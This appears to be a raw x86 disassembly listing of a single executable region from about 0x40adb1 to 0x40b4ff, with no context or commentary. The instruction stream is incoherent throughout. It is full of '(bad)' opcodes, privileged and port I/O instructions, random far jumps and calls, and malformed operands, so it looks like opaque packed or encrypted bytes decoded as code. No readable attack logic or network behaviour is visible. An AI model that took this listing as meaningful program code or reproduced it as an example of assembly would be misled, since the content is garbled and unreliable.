  40adb1:	mov    al,ds:0x3be1a9dd
  40adb6:	push   0x5dc300cf
  40adbb:	push   edi
  40adbc:	dec    ebp
  40adbd:	dec    edi
  40adbe:	scas   al,BYTE PTR es:[edi]
  40adbf:	ins    BYTE PTR es:[edi],dx
  40adc0:	sbb    ah,BYTE PTR [eax]
  40adc2:	outs   dx,DWORD PTR ds:[esi]
  40adc3:	adc    eax,0x20b924ed
  40adc8:	mov    ebp,0x6d38a5b7
  40adcd:	icebp  
  40adce:	cdq    
  40adcf:	adc    ah,ch
  40add1:	pop    eax
  40add2:	pop    edi
  40add3:	or     ebp,edx
  40add5:	inc    edi
  40add6:	lods   al,BYTE PTR ds:[esi]
  40add7:	(bad)  
  40add8:	xlat   BYTE PTR ds:[ebx]
  40add9:	mov    ebx,0x2895228c
  40adde:	dec    esp
  40addf:	or     al,0x7f
  40ade1:	xor    edi,esi
  40ade3:	jg     0x40ae4a
  40ade5:	push   ecx
  40ade6:	jmp    0x78fb:0xcb7817ec
  40aded:	or     DWORD PTR [esi-0x6b],ebp
  40adf0:	add    dl,BYTE PTR ds:0x27127e23
  40adf6:	ja     0x40ae30
  40adf8:	sbb    BYTE PTR [ebx],cl
  40adfa:	sub    esi,DWORD PTR [ecx+0x2d]
  40adfd:	pop    ebp
  40adfe:	push   0xea89124b
  40ae03:	mov    ds:0xb9621cb5,al
  40ae08:	ror    DWORD PTR [ecx+0x7c1b38bf],0xa0
  40ae0f:	mov    ebp,0x15c573a3
  40ae14:	cmc    
  40ae15:	and    ecx,edx
  40ae17:	fcom   st(3)
  40ae19:	outs   dx,BYTE PTR ds:[esi]
  40ae1a:	test   al,0xd5
  40ae1c:	pop    edx
  40ae1d:	cmp    BYTE PTR [edx+0xe],bl
  40ae20:	jmp    0x40ae11
  40ae22:	xchg   DWORD PTR [eax-0x4a9124d4],eax
  40ae28:	cmp    al,0x25
  40ae2a:	call   0xf638:0xd01a92b1
  40ae31:	(bad)  
  40ae33:	scas   al,BYTE PTR es:[edi]
  40ae34:	pop    esp
  40ae35:	cli    
  40ae36:	fyl2x  
  40ae38:	test   BYTE PTR [ebp-0x56],0xb4
  40ae3c:	add    al,0x81
  40ae3e:	jge    0x40adfc
  40ae40:	aad    0x68
  40ae42:	test   DWORD PTR [edx],ebx
  40ae44:	out    0x34,al
  40ae46:	inc    edi
  40ae47:	stc    
  40ae48:	shr    BYTE PTR [ebp-0x2e],cl
  40ae4b:	das    
  40ae4c:	cmp    ah,BYTE PTR [ecx+0x7a5b696e]
  40ae52:	dec    edx
  40ae53:	push   esi
  40ae54:	mov    esi,0x9d44df21
  40ae59:	cmp    edi,DWORD PTR [edi+0x3053da1e]
  40ae5f:	mov    cl,0x1
  40ae61:	imul   ebp,DWORD PTR [eax+0x17],0xffffff81
  40ae65:	mov    eax,ds:0xe59c5e7d
  40ae6a:	inc    esi
  40ae6b:	idiv   bl
  40ae6d:	cmp    ebx,DWORD PTR [eax-0x7cd62ec1]
  40ae73:	xchg   ecx,eax
  40ae74:	lea    eax,[esi+0x1b41c579]
  40ae7a:	outs   dx,BYTE PTR ds:[esi]
  40ae7b:	lock push eax
  40ae7d:	sbb    DWORD PTR [esi],ecx
  40ae7f:	push   0x604706aa
  40ae84:	add    BYTE PTR [esi-0x4473e79d],al
  40ae8a:	rcl    DWORD PTR [esi+esi*4],cl
  40ae8d:	pop    esi
  40ae8e:	push   ebp
  40ae8f:	mov    esp,0x5f0817e8
  40ae94:	push   0xfffffff0
  40ae96:	hlt    
  40ae97:	mov    cl,0x1f
  40ae99:	pushf  
  40ae9a:	cmp    DWORD PTR [ecx-0x24],esi
  40ae9d:	fidivr WORD PTR [esi-0x24aa5fbc]
  40aea3:	cmp    BYTE PTR [edi+0x76],bl
  40aea6:	out    dx,al
  40aea7:	test   al,0x66
  40aea9:	mov    edi,0x21e43a0d
  40aeae:	xor    DWORD PTR [edx+0x8703837],edx
  40aeb4:	jmp    0x40aef1
  40aeb6:	fwait
  40aeb7:	cmp    bh,cl
  40aeb9:	dec    esi
  40aeba:	fs pop ecx
  40aebc:	mov    ch,0xec
  40aebe:	cmp    bh,BYTE PTR [esi*8-0x77884f9b]
  40aec5:	pop    es
  40aec6:	and    eax,DWORD PTR [ebx-0x33d5c82e]
  40aecc:	hlt    
  40aecd:	(bad)
  40aed1:	mov    dl,cl
  40aed3:	cmp    BYTE PTR [edx],bh
  40aed5:	(bad)  
  40aed6:	mov    ebx,0x323d932d
  40aedb:	ss stc 
  40aedd:	push   es
  40aede:	mov    DWORD PTR es:[eax-0x61],ebp
  40aee2:	pop    eax
  40aee3:	cmp    BYTE PTR [eax+0x2b216691],ah
  40aee9:	pop    esi
  40aeea:	outs   dx,DWORD PTR ds:[esi]
  40aeeb:	xchg   ecx,eax
  40aeec:	inc    esi
  40aeed:	imul   ebx,DWORD PTR [ebx-0x559dcba9],0x39
  40aef4:	das    
  40aef5:	hlt    
  40aef6:	dec    ecx
  40aef7:	xor    eax,0x7d6d2971
  40aefc:	jg     0x40af77
  40aefe:	jo     0x40aed1
  40af00:	fcom   QWORD PTR [esi+0x657038af]
  40af06:	dec    ebx
  40af07:	mov    ds:0x1bac3bc3,al
  40af0c:	mov    ecx,0xc4dc7646
  40af11:	adc    ch,BYTE PTR [eax-0x71]
  40af14:	cmp    DWORD PTR [eax],ebp
  40af16:	jmp    0x40af23
  40af18:	aam    0xdb
  40af1a:	pop    ebp
  40af1b:	test   edi,0xc9d68906
  40af21:	jnp    0x40af9d
  40af23:	and    eax,0x28463e36
  40af28:	cmc    
  40af29:	(bad)  
  40af2a:	push   0xf3396831
  40af2f:	popf   
  40af30:	fwait
  40af31:	cmp    ebx,DWORD PTR [esi]
  40af33:	or     DWORD PTR [edi],ebx
  40af35:	sahf   
  40af36:	sub    bl,BYTE PTR fs:[esi-0x3]
  40af3a:	outs   dx,BYTE PTR ds:[esi]
  40af3b:	xchg   esp,eax
  40af3c:	iret   
  40af3d:	mov    cl,0x6
  40af3f:	loop   0x40af57
  40af41:	mov    ecx,0x78230094
  40af46:	outs   dx,DWORD PTR ds:[esi]
  40af47:	sbb    ch,BYTE PTR [eax+0x32bd13c1]
  40af4d:	shr    DWORD PTR [esi+0x77],1
  40af50:	and    al,BYTE PTR [ecx+0x733949e1]
  40af56:	sti    
  40af57:	call   0xc5941bd6
  40af5c:	jle    0x40af5f
  40af5e:	aam    0xc2
  40af60:	loopne 0x40af9a
  40af62:	cld    
  40af63:	xor    bh,BYTE PTR [ecx-0x48]
  40af66:	jmp    0xde38:0xf3283167
  40af6d:	add    edx,DWORD PTR [esp+ecx*8]
  40af70:	pop    ss
  40af71:	retf   
  40af72:	xor    eax,0x239dee20
  40af77:	sbb    bl,dl
  40af79:	jnp    0x40af73
  40af7b:	aaa    
  40af7c:	add    esi,ebx
  40af7e:	clc    
  40af7f:	jmp    0x40af48
  40af81:	leave  
  40af82:	outs   dx,BYTE PTR ds:[esi]
  40af83:	or     eax,0xd6ff42d0
  40af88:	jp     0x40af7c
  40af8a:	mov    ch,0x38
  40af8c:	out    dx,al
  40af8d:	iret   
  40af8e:	jl     0x40b001
  40af90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af91:	call   0x875595c8
  40af96:	hlt    
  40af97:	lock mov ch,0xd7
  40af9a:	les    edi,FWORD PTR [edi+0x3927688c]
  40afa0:	(bad)  
  40afa1:	int3   
  40afa2:	sbb    al,0x5d
  40afa4:	js     0x40afd9
  40afa6:	mov    ebp,0x7399f5e4
  40afab:	sbb    BYTE PTR [edx-0x322d3cf9],dh
  40afb1:	cmp    esp,edi
  40afb3:	mov    edx,0x1ee545ba
  40afb8:	pop    ds
  40afb9:	mov    dl,0x6e
  40afbb:	iret   
  40afbc:	mov    esi,DWORD PTR [edx+0x709fe441]
  40afc2:	jne    0x40affc
  40afc4:	cmp    DWORD PTR cs:[edx+0xa87c366],0xef4df59c
  40afcf:	or     esi,DWORD PTR [ebx+eiz*4-0x58]
  40afd3:	xchg   edi,eax
  40afd4:	mov    ah,0x30
  40afd6:	cmp    BYTE PTR [ebx-0x3c],ah
  40afd9:	cdq    
  40afda:	out    dx,eax
  40afdb:	repz idiv DWORD PTR [eax+0x7d]
  40afdf:	and    esi,0xce146e94
  40afe5:	imul   DWORD PTR [ecx]
  40afe7:	ins    DWORD PTR es:[edi],dx
  40afe8:	rcr    DWORD PTR [ebx+0x68],0x38
  40afec:	fidiv  DWORD PTR [ebp-0x64]
  40afef:	test   DWORD PTR [edx],esp
  40aff1:	sub    eax,0x1af52417
  40aff6:	call   0xe7904923
  40affb:	inc    edi
  40affc:	fnstsw WORD PTR [ebx]
  40affe:	mov    eax,ds:0x659f40b2
  40b003:	inc    ebp
  40b004:	xchg   edx,eax
  40b005:	aas    
  40b006:	outs   dx,BYTE PTR ds:[esi]
  40b007:	xor    BYTE PTR [ebp-0x4c],al
  40b00a:	jmp    0xe7372298
  40b00f:	cmp    BYTE PTR [eax],dh
  40b011:	repz mov ebp,ss
  40b014:	pop    ss
  40b015:	jle    0x40b070
  40b017:	into   
  40b018:	pop    ebp
  40b019:	sbb    eax,0xb9f5bb53
  40b01e:	inc    edi
  40b01f:	or     eax,0xd4391ebe
  40b024:	cwde   
  40b025:	cmp    eax,DWORD PTR [ecx+esi*2]
  40b028:	push   ecx
  40b029:	data16 clc 
  40b02b:	pop    ecx
  40b02c:	hlt    
  40b02d:	xlat   BYTE PTR ds:[ebx]
  40b02e:	cmp    BYTE PTR [edx],0x26
  40b031:	daa    
  40b032:	out    dx,eax
  40b033:	adc    DWORD PTR [edi],edx
  40b035:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b036:	outs   dx,DWORD PTR ds:[esi]
  40b037:	jmp    0x40b028
  40b039:	cmp    cl,cl
  40b03b:	add    ebp,DWORD PTR [esi+0x76584a0c]
  40b041:	dec    esp
  40b042:	outs   dx,DWORD PTR ds:[esi]
  40b043:	jns    0x40b038
  40b045:	dec    esi
  40b046:	out    0x26,al
  40b048:	lea    esp,ss:[ebx]
  40b04b:	cmp    DWORD PTR [eax+edx*2+0x1216deb7],edi
  40b052:	mov    ebp,0x378ce88d
  40b057:	sbb    eax,DWORD PTR [esi-0x679edd6d]
  40b05d:	sbb    eax,0x4dbc3883
  40b062:	scas   al,BYTE PTR es:[edi]
  40b063:	mov    dl,BYTE PTR [ecx]
  40b065:	sbb    al,0x43
  40b067:	mov    ch,dh
  40b069:	xor    eax,0x67bebd5f
  40b06e:	cmp    dh,BYTE PTR [edi+0x5f]
  40b071:	cmp    BYTE PTR [eax+0x51],dh
  40b074:	arpl   WORD PTR [ecx+0x12529c7],ax
  40b07a:	jl     0x40b060
  40b07c:	jnp    0x40b083
  40b07e:	and    BYTE PTR [esi],bh
  40b080:	inc    ecx
  40b081:	aas    
  40b082:	addr16 jge 0x40b02e
  40b085:	sti    
  40b086:	xchg   esi,eax
  40b087:	cmp    ch,ch
  40b089:	pushf  
  40b08a:	sbb    eax,0x8c9d741d
  40b08f:	jge    0x40b07d
  40b091:	pop    ebp
  40b092:	sub    DWORD PTR fs:[esi+0x3e],eax
  40b096:	jle    0x40b0d9
  40b098:	cmp    dh,BYTE PTR [edx]
  40b09a:	xor    bh,BYTE PTR [ecx]
  40b09c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b09d:	dec    ebp
  40b09e:	sahf   
  40b09f:	cmp    al,BYTE PTR [ebx-0x6b]
  40b0a2:	xor    eax,0x7ff1f5ac
  40b0a7:	in     eax,dx
  40b0a8:	imul   ecx,DWORD PTR [ebx+ebx*4+0x31],0xffffffc7
  40b0ad:	cmp    edi,esi
  40b0af:	and    al,0x6a
  40b0b1:	ss sub al,0x3d
  40b0b4:	pop    ecx
  40b0b5:	in     al,0x6e
  40b0b7:	sub    eax,0xfb22a5af
  40b0bc:	sub    DWORD PTR [esp+esi*4],esp
  40b0bf:	cmp    BYTE PTR [edx-0x5b],al
  40b0c2:	xchg   edx,esi
  40b0c4:	adc    al,0xe
  40b0c6:	andnps xmm6,xmm5
  40b0c9:	jnp    0x40b0c0
  40b0cb:	lods   eax,DWORD PTR gs:[esi]
  40b0cd:	popa   
  40b0ce:	(bad)  
  40b0cf:	ja     0x40b136
  40b0d1:	cmp    BYTE PTR [edi+0x28],ah
  40b0d4:	int    0xc5
  40b0d6:	add    BYTE PTR [ebx+0x6e],0x44
  40b0da:	push   0x454c3a81
  40b0df:	cmp    eax,eax
  40b0e1:	and    al,0x63
  40b0e3:	lods   eax,DWORD PTR ds:[esi]
  40b0e4:	mov    eax,ds:0xe5bcf03b
  40b0e9:	outs   dx,BYTE PTR ds:[esi]
  40b0ea:	xchg   ecx,eax
  40b0eb:	imul   al
  40b0ed:	retf   0x2c6
  40b0f0:	int    0x3b
  40b0f2:	stc    
  40b0f3:	pop    ebx
  40b0f4:	mov    dl,0xf
  40b0f6:	scas   eax,DWORD PTR es:[edi]
  40b0f7:	push   ecx
  40b0f8:	pusha  
  40b0f9:	cmp    BYTE PTR [eax+0x4e],dl
  40b0fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0fd:	inc    eax
  40b0fe:	dec    eax
  40b0ff:	sub    BYTE PTR [esi+esi*2+0x60afa26f],al
  40b106:	cmp    bh,BYTE PTR [ebp+0x1a5a357d]
  40b10c:	retf   
  40b10d:	or     ebp,DWORD PTR [ebx]
  40b10f:	mov    ecx,0x6836b896
  40b114:	mov    edx,0xc7166f5e
  40b119:	sbb    eax,0xc1fc786b
  40b11e:	and    bh,BYTE PTR [ecx]
  40b120:	stos   DWORD PTR es:[edi],eax
  40b121:	ret    0xbf0b
  40b124:	enter  0x6335,0x58
  40b128:	adc    ch,ch
  40b12a:	inc    ebx
  40b12b:	push   0xffffffb5
  40b12d:	lods   eax,DWORD PTR ds:[esi]
  40b12e:	pop    es
  40b12f:	mov    ax,ds:0x74ed56d
  40b135:	cmp    BYTE PTR [ebx-0x69cbf519],ah
  40b13b:	sbb    DWORD PTR [edx],edi
  40b13d:	dec    ebp
  40b13e:	jge    0x40b141
  40b140:	jecxz  0x40b146
  40b142:	clc    
  40b143:	fsubr  DWORD PTR [ebx]
  40b145:	ret    0x530a
  40b148:	iret   
  40b149:	cmp    esp,DWORD PTR [esi-0x67]
  40b14c:	imul   ebx,ebp,0xffffffd7
  40b14f:	inc    ebp
  40b150:	dec    esp
  40b151:	sti    
  40b152:	jne    0x40b154
  40b154:	pop    ecx
  40b155:	jmp    0xe0c5:0x17f5f478
  40b15c:	push   ebx
  40b15d:	or     bh,dh
  40b15f:	pop    ebp
  40b160:	cli    
  40b161:	cmp    esp,edx
  40b163:	int3   
  40b164:	mov    esi,0xf56c77a2
  40b169:	fwait
  40b16a:	xchg   esi,eax
  40b16b:	mov    edi,0xae7edc89
  40b170:	aam    0xa3
  40b172:	ins    DWORD PTR es:[edi],dx
  40b173:	cmp    DWORD PTR [eax+edi*2-0x2e],ebp
  40b177:	dec    esi
  40b178:	retf   
  40b179:	xchg   esi,eax
  40b17a:	shr    DWORD PTR [edi],0xf5
  40b17d:	stos   DWORD PTR es:[edi],eax
  40b17e:	mov    edx,0xd621748c
  40b183:	bound  ecx,QWORD PTR [ecx]
  40b185:	cmp    BYTE PTR [ecx],ch
  40b187:	xor    dh,dh
  40b189:	inc    dx
  40b18b:	mov    dl,0x75
  40b18d:	shl    BYTE PTR [ebp-0x21],0x18
  40b191:	push   cs
  40b192:	xor    al,0x1f
  40b194:	inc    ebp
  40b195:	lahf   
  40b196:	push   edi
  40b197:	(bad)  
  40b198:	pusha  
  40b199:	out    0x94,al
  40b19b:	(bad)  
  40b19c:	mov    ebp,0x81076281
  40b1a1:	icebp  
  40b1a2:	cmc    
  40b1a3:	pop    ss
  40b1a4:	arpl   WORD PTR [eax+0x47],bx
  40b1a7:	sbb    DWORD PTR [ebp+0x1b],ecx
  40b1aa:	jmp    0x40b17e
  40b1ac:	cmc    
  40b1ad:	or     al,0x99
  40b1af:	fild   WORD PTR ds:0x72040337
  40b1b5:	cmp    BYTE PTR [edx],al
  40b1b7:	fidiv  DWORD PTR [edx+esi*8-0x7]
  40b1bb:	inc    edx
  40b1bc:	jecxz  0x40b239
  40b1be:	outs   dx,DWORD PTR ds:[esi]
  40b1bf:	dec    eax
  40b1c0:	sbb    eax,0x2a6ea5aa
  40b1c5:	test   eax,0x79373869
  40b1ca:	push   ds
  40b1cb:	bound  esi,QWORD PTR [edi+0x16]
  40b1ce:	dec    edi
  40b1cf:	jge    0x40b1ca
  40b1d1:	pop    es
  40b1d2:	jl     0x40b203
  40b1d4:	cld    
  40b1d5:	push   ebp
  40b1d6:	push   edi
  40b1d7:	mov    ecx,0x85c0c4ff
  40b1dc:	mov    WORD PTR [ebx],?
  40b1de:	repnz fwait
  40b1e0:	stos   DWORD PTR es:[edi],eax
  40b1e1:	pop    eax
  40b1e2:	ret    
  40b1e3:	jge    0x40b234
  40b1e5:	arpl   WORD PTR [ebx+eiz*1-0x1610928f],cx
  40b1ec:	and    BYTE PTR [edi+0x37],cl
  40b1ef:	or     eax,0xefd33843
  40b1f4:	mov    eax,ds:0x3d887df6
  40b1f9:	or     ch,BYTE PTR [esi+0x28]
  40b1fc:	inc    ecx
  40b1fd:	ret    0xd1d1
  40b200:	fwait
  40b201:	popf   
  40b202:	xor    eax,0x6c0f5d39
  40b207:	xor    al,BYTE PTR [edx-0x79]
  40b20a:	(bad)  
  40b20c:	cmc    
  40b20d:	cmp    eax,0x418e0379
  40b212:	push   ebx
  40b213:	dec    esp
  40b214:	pushf  
  40b215:	xor    al,0xc6
  40b217:	arpl   WORD PTR [edi+0x1a],si
  40b21a:	outs   dx,DWORD PTR ds:[esi]
  40b21b:	rol    DWORD PTR [ebx-0x2d],1
  40b21e:	mov    ebp,0x87e5f468
  40b223:	mov    ebp,0x35bb7109
  40b228:	ror    DWORD PTR [edx+0x2753348],0x30
  40b22f:	aaa    
  40b230:	add    ebp,DWORD PTR [edx+0x6f]
  40b233:	ja     0x40b296
  40b235:	sbb    eax,0x474d11f9
  40b23a:	outs   dx,BYTE PTR ds:[esi]
  40b23b:	add    eax,0x14eee80f
  40b240:	mov    eax,0xdc29c864
  40b245:	jno    0x40b2b1
  40b247:	jo     0x40b2a9
  40b249:	xchg   ebx,eax
  40b24a:	push   ecx
  40b24b:	in     eax,0x57
  40b24d:	mov    eax,0x38ecf2e9
  40b252:	(bad)  
  40b254:	adc    BYTE PTR gs:[eax-0x50],al
  40b258:	adc    eax,DWORD PTR [eax]
  40b25a:	fisubr DWORD PTR [edi]
  40b25c:	cmc    
  40b25d:	dec    eax
  40b25e:	bound  esi,QWORD PTR [edx+eiz*1-0x8677573]
  40b265:	cmp    BYTE PTR [ecx+0x1a358249],al
  40b26b:	rcl    esp,cl
  40b26d:	pop    esp
  40b26e:	outs   dx,DWORD PTR ds:[esi]
  40b26f:	in     eax,0x4a
  40b271:	xchg   ebp,esi
  40b273:	div    BYTE PTR [eax+0x61]
  40b276:	and    bh,BYTE PTR [ecx]
  40b278:	rcl    BYTE PTR [edi],1
  40b27a:	icebp  
  40b27b:	and    DWORD PTR [ebx],ecx
  40b27d:	das    
  40b27e:	add    eax,0x33bdf58c
  40b283:	cmp    esi,DWORD PTR [edi+0x19]
  40b286:	mov    DWORD PTR [ecx-0xc0fc7e5],ebp
  40b28c:	push   ebx
  40b28d:	push   eax
  40b28e:	gs mov ah,0x35
  40b291:	sub    al,0x6f
  40b293:	xor    DWORD PTR [edi+0x5ac0f49a],ebx
  40b299:	xchg   edi,eax
  40b29a:	lods   eax,DWORD PTR ds:[esi]
  40b29b:	cmp    dl,al
  40b29d:	xchg   BYTE PTR ds:0x846e2c7f,ah
  40b2a3:	lock xor esp,DWORD PTR [esi+0x5a]
  40b2a7:	leave  
  40b2a8:	cmc    
  40b2a9:	adc    BYTE PTR [esi],bl
  40b2ab:	mov    ?,WORD PTR [eax]
  40b2ad:	push   ebp
  40b2ae:	mov    eax,ds:0xc3383ecd
  40b2b3:	das    
  40b2b4:	and    DWORD PTR [edx],esi
  40b2b6:	xchg   ecx,eax
  40b2b7:	pop    ebp
  40b2b8:	and    esi,DWORD PTR [ecx+0x3f4c3578]
  40b2be:	outs   dx,BYTE PTR ds:[esi]
  40b2bf:	leave  
  40b2c0:	jecxz  0x40b2f2
  40b2c2:	add    ch,BYTE PTR [ebp-0x62]
  40b2c5:	cmp    dl,BYTE PTR [edi+eax*8]
  40b2c8:	fbld   TBYTE PTR [eax+0x36]
  40b2cb:	les    ecx,FWORD PTR [ebp+0x4c]
  40b2ce:	dec    eax
  40b2cf:	jb     0x40b2cc
  40b2d1:	cld    
  40b2d2:	outs   dx,BYTE PTR ds:[esi]
  40b2d3:	repz adc ch,ah
  40b2d6:	fxtract 
  40b2d8:	aad    0x59
  40b2da:	sar    BYTE PTR ds:0x83a32656,1
  40b2e0:	aaa    
  40b2e1:	cmp    dh,dh
  40b2e3:	sbb    eax,0x9f6661d4
  40b2e8:	call   0xc210f0c7
  40b2ed:	shr    DWORD PTR [esi],0xc3
  40b2f0:	iret   
  40b2f1:	cmp    eax,eax
  40b2f3:	cmp    BYTE PTR [eax],bl
  40b2f5:	cmc    
  40b2f6:	cld    
  40b2f7:	sbb    al,0xfb
  40b2f9:	aas    
  40b2fa:	rcl    BYTE PTR [ebp+0x70],0xf4
  40b2fe:	outs   dx,DWORD PTR ds:[esi]
  40b2ff:	leave  
  40b300:	jbe    0x40b2a8
  40b302:	cmp    BYTE PTR ds:0x843ee4d4,ch
  40b308:	mov    ch,0xe7
  40b30a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b30b:	mov    DWORD PTR [ebp+0x11],esi
  40b30e:	inc    ebx
  40b30f:	loop   0x40b300
  40b311:	pop    esi
  40b312:	add    ecx,DWORD PTR [ebx-0x9]
  40b315:	mov    dl,0x40
  40b317:	mov    ds:0x78803f4e,eax
  40b31c:	adc    eax,0x8e3fc11e
  40b321:	pop    es
  40b322:	jbe    0x40b37a
  40b324:	xchg   esi,eax
  40b325:	sbb    ebp,esi
  40b327:	cwde   
  40b328:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b329:	jmp    0xf0c869c
  40b32e:	mov    al,0xda
  40b330:	(bad)  
  40b331:	or     al,0xc3
  40b333:	xor    eax,esp
  40b335:	inc    esp
  40b336:	pop    ebx
  40b337:	adc    dh,BYTE PTR ds:0x5fc021
  40b33d:	xchg   BYTE PTR [edi],dh
  40b33f:	outs   dx,BYTE PTR ds:[esi]
  40b340:	ss sub al,0xa0
  40b343:	add    edx,DWORD PTR [eax+eax*4]
  40b346:	neg    ch
  40b348:	mov    ch,0xa5
  40b34a:	xchg   edx,eax
  40b34b:	les    ecx,FWORD PTR [eax+0x6f]
  40b34e:	xchg   edi,eax
  40b34f:	dec    ebx
  40b350:	int    0x7d
  40b352:	adc    eax,0x63329039
  40b357:	pop    ss
  40b358:	mov    dh,0x74
  40b35a:	popf   
  40b35b:	cmp    eax,0xb2f23cf5
  40b360:	in     al,dx
  40b361:	shr    DWORD PTR [edi+eax*1-0x64],1
  40b365:	cmp    esi,DWORD PTR [esi+0x1eafe887]
  40b36b:	and    al,0xca
  40b36d:	sub    BYTE PTR [edi+0xc],0x9
  40b371:	mov    al,ds:0x19815089
  40b376:	bound  ebp,QWORD PTR [esi+eiz*4]
  40b379:	cmp    ebx,DWORD PTR [esp+eiz*2]
  40b37c:	into   
  40b37d:	pop    edi
  40b37e:	sbb    bh,bl
  40b380:	out    0x54,al
  40b382:	outs   dx,DWORD PTR ds:[esi]
  40b383:	call   DWORD PTR [eax-0x64c023e3]
  40b389:	adc    dh,BYTE PTR cs:[eax]
  40b38c:	sbb    DWORD PTR [ebp-0x751b199e],0xffffffea
  40b393:	sbb    dl,ch
  40b395:	and    cl,BYTE PTR [ecx+0x6d]
  40b398:	in     al,0x6f
  40b39a:	mov    ds:0x829b82c1,eax
  40b39f:	int3   
  40b3a0:	stc    
  40b3a1:	and    eax,0x4a7b3899
  40b3a6:	retf   0x26fd
  40b3a9:	int3   
  40b3aa:	jmp    0x40b421
  40b3ac:	cmc    
  40b3ad:	mov    esp,0xcbb6ac73
  40b3b2:	jp     0x40b3d0
  40b3b4:	pop    ds
  40b3b5:	add    DWORD PTR [ecx+edx*8+0x4b],ecx
  40b3b9:	cmp    cl,BYTE PTR [ecx-0xed96c17]
  40b3bf:	inc    ebp
  40b3c0:	mov    esi,0x816b3630
  40b3c5:	fstp   TBYTE PTR [ebx+0x78]
  40b3c8:	out    0x0,al
  40b3ca:	fcom   DWORD PTR [esi*8-0x4e093cff]
  40b3d1:	inc    esp
  40b3d2:	adc    DWORD PTR [ebp+0x63],edx
  40b3d5:	cmp    BYTE PTR [esp+eax*1],cl
  40b3d8:	pop    edi
  40b3d9:	pop    eax
  40b3da:	scas   eax,DWORD PTR es:[edi]
  40b3db:	or     eax,0x8f6b41aa
  40b3e0:	call   0xb5bdca47
  40b3e5:	pop    edx
  40b3e6:	cmc    
  40b3e7:	inc    esi
  40b3e8:	push   ebx
  40b3e9:	cmp    BYTE PTR [esi-0x618f8646],ah
  40b3ef:	add    ch,BYTE PTR [esp]
  40b3f2:	outs   dx,DWORD PTR ds:[esi]
  40b3f3:	mov    ah,0x35
  40b3f5:	cmp    DWORD PTR [edi-0x346776f2],ebx
  40b3fb:	int3   
  40b3fc:	push   ss
  40b3fd:	push   ds
  40b3fe:	jmp    0x5924:0x693bb988
  40b405:	icebp  
  40b406:	jb     0x40b39e
  40b408:	neg    BYTE PTR [eax+0x79]
  40b40b:	pop    ss
  40b40c:	jnp    0x40b3e5
  40b40e:	mov    DWORD PTR [edi-0x7de3a438],eax
  40b414:	inc    esp
  40b415:	xor    eax,0xfd3ebf9a
  40b41a:	outs   dx,BYTE PTR ds:[esi]
  40b41b:	add    al,0x19
  40b41d:	popa   
  40b41e:	jmp    esi
  40b420:	aas    
  40b421:	mov    eax,ebx
  40b423:	cmp    ah,bh
  40b425:	push   edx
  40b426:	mov    bh,0xdc
  40b428:	dec    esp
  40b429:	outs   dx,DWORD PTR ds:[esi]
  40b42a:	jg     0x40b414
  40b42c:	lods   al,BYTE PTR ds:[esi]
  40b42d:	dec    eax
  40b42e:	lock cmp BYTE PTR [ecx+0x5f],bl
  40b432:	dec    edx
  40b433:	int    0x11
  40b435:	mov    ch,0xab
  40b437:	inc    esi
  40b438:	cmc    
  40b439:	adc    bh,BYTE PTR [esi+eiz*2+0x47fcea8d]
  40b440:	inc    ebp
  40b441:	cmp    BYTE PTR [edi+0x5a],ch
  40b444:	jle    0x40b4a8
  40b446:	pushf  
  40b447:	xchg   edi,eax
  40b448:	mov    DWORD PTR [edx+0x6f],ebx
  40b44b:	jbe    0x40b468
  40b44d:	call   DWORD PTR [ecx+edi*2-0x74]
  40b451:	jns    0x40b3f1
  40b453:	cmp    DWORD PTR [edx-0x4f50aae3],esp
  40b459:	cmp    eax,0xf81c08e7
  40b45e:	mov    eax,ds:0x5438ed0f
  40b463:	int3   
  40b464:	sbb    BYTE PTR [ecx+0x3817e1f7],ah
  40b46a:	jnp    0x40b404
  40b46c:	popa   
  40b46d:	mov    cl,0x2f
  40b46f:	mov    WORD PTR [edi+0x39],cs
  40b472:	jo     0x40b478
  40b474:	ja     0x40b4d6
  40b476:	or     al,0x39
  40b478:	fiadd  DWORD PTR [ecx]
  40b47a:	fwait
  40b47b:	call   FWORD PTR [ecx]
  40b47d:	cmp    BYTE PTR [ecx+0x5e],ah
  40b480:	fcomp  st(4)
  40b482:	in     eax,dx
  40b483:	addr16 imul esi,ebx,0x6e
  40b487:	(bad)  
  40b488:	stc    
  40b489:	push   esi
  40b48a:	ficom  WORD PTR [esi-0x24]
  40b48d:	cs pop esi
  40b48f:	cmp    edx,ecx
  40b491:	popa   
  40b492:	imul   ecx,DWORD PTR [edi-0x62],0xfffffffe
  40b496:	push   edx
  40b497:	fwait
  40b498:	cmc    
  40b499:	(bad)  
  40b49a:	iret   
  40b49b:	adc    BYTE PTR [edx+0x30070eab],bh
  40b4a1:	cmp    BYTE PTR [esi],dh
  40b4a3:	jecxz  0x40b4d3
  40b4a5:	jno    0x40b4c5
  40b4a7:	or     esi,DWORD PTR [esp+eax*4]
  40b4aa:	outs   dx,BYTE PTR ds:[esi]
  40b4ab:	ja     0x40b430
  40b4ad:	mov    edx,0x25ae9654
  40b4b2:	mov    ebp,0xe1eced38
  40b4b7:	fdivr  QWORD PTR [ebx-0x1f1aa6e4]
  40b4bd:	or     bh,bl
  40b4bf:	cmp    al,0xe4
  40b4c1:	mov    ebp,edi
  40b4c3:	fadd   st,st(6)
  40b4c5:	mov    ah,BYTE PTR [ebp+0x68]
  40b4c8:	sti    
  40b4c9:	cmp    esp,DWORD PTR [esi-0x3f6bbd4b]
  40b4cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b4d0:	adc    DWORD PTR [edx+0x7e],esi
  40b4d3:	add    ah,BYTE PTR [ecx+0x3]
  40b4d6:	mov    ebx,DWORD PTR [eax+0x75]
  40b4d9:	push   cs
  40b4da:	(bad)  
  40b4db:	mov    ebp,0x8ef109de
  40b4e0:	int    0xdf
  40b4e2:	dec    esi
  40b4e3:	(bad)  
  40b4e4:	pop    ebx
  40b4e5:	dec    ebp
  40b4e6:	aad    0xd1
  40b4e8:	cmc    
  40b4e9:	dec    BYTE PTR [ebx+0x2572a06d]
  40b4ef:	adc    BYTE PTR [ebx+0x6],bh
  40b4f2:	mov    fs,WORD PTR [ecx-0x74f507d3]
  40b4f8:	(bad)  
  40b4f9:	(bad)  
  40b4fa:	jmp    0xe7a498e0
  40b4ff:	jecxz  0x40b496
